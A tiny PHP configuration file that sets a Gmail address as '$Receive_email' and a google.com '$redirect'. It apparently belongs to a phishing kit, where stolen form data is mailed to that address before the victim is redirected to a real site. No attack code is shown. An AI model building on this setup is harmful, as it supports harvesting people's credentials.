<?php 
$Receive_email="brainlogx28@gmail.com";
$redirect="https://www.google.com/";
?>